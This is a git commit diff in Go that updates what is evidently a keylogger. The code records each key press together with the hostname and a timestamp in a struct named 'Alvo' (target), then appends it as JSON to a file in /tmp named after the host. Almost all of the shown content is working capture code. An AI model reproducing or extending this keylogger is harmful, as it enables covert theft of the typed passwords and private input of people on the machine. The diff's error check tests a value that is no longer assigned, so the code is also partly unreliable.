aeccdbdd6c5489702e094ba36b9bee061f2830ff
Lincoln Romais <lincoln.romais@concrete.com.br>
2020-07-15 15:30:47 -0300

    update no log em json

--- novo.go
+++ novo.go
@@ -50,6 +50,46 @@ func GetTime() (hora string) {
 	return string(hora)
 }
 
+/*
+func chkMap(payload map[string]interface{}) (ret bool) {
+	limit, lmtOk := payload["Limit"]
+	value, valOk := payload["Value"]
+	if lmtOk && valOk {
+		if value.(float64) < limit.(float64) {
+			ret = true
+			return
+		}
+	}
+
+	for _, v := range payload {
+		switch v.(type) {
+		case []interface{}:
+			ret = chkSlice(v.([]interface{}))
+		case map[string]interface{}:
+			ret = chkMap(v.(map[string]interface{}))
+		}
+		if ret {
+			return
+		}
+	}
+	return
+}
+
+func chkSlice(payload []interface{}) (ret bool) {
+	for _, v := range payload {
+		switch v.(type) {
+		case []interface{}:
+			ret = chkSlice(v.([]interface{}))
+		case map[string]interface{}:
+			ret = chkMap(v.(map[string]interface{}))
+		}
+		if ret {
+			return
+		}
+	}
+	return
+}
+*/
 func main() {
 
 	fmt.Println(GetHostname())
@@ -82,21 +122,48 @@ func main() {
 
 			// if the state of key is pressed
 			if e.KeyPress() {
-				emp := &Alvo{Hostname: GetHostname(), Hora: GetTime(), Press: LOGpart1, Keypress: e.KeyString()}
-				e, err := json.Marshal(emp)
+				dados := &Alvo{
+					Hostname: GetHostname(),
+					Hora:     GetTime(),
+					Press:    LOGpart1,
+					Keypress: e.KeyString(),
+				}
+
+				file, _ := json.MarshalIndent(dados, "", " ")
+				//e, err := json.Marshal(dados)
 				if err != nil {
 					fmt.Println(err)
 					return
 				}
 
-				f, err := os.OpenFile("/tmp/teclado"+GetHostname(), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+				f, err := os.OpenFile("/tmp/teclado-"+GetHostname()+".json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 				if err != nil {
 					log.Println(err)
 				}
 				defer f.Close()
-				if _, err := f.WriteString(string(e) + "\n"); err != nil {
+				if _, err := f.WriteString(string(file) + "\n"); err != nil {
 					log.Println(err)
 				}
+				fmt.Printf("host %s tecla %s ", dados.Hostname, dados.Keypress)
+				/*
+					//novo bloco
+					data, err := ioutil.ReadFile("/tmp/teclado-" + GetHostname() + ".json")
+					if err != nil {
+						fmt.Println(err)
+						return
+					}
+					payload := make(map[string]interface{})
+					err = json.Unmarshal(data, &payload)
+					if err != nil {
+						fmt.Println(err)
+						return
+					}
+				*/
+				/*				if chkMap(payload) {
+									fmt.Println("Um ou mais itens abaixo do limite")
+								}
+								fmt.Println("fim")
+				*/
 			}
 
 			// if the state of key is released
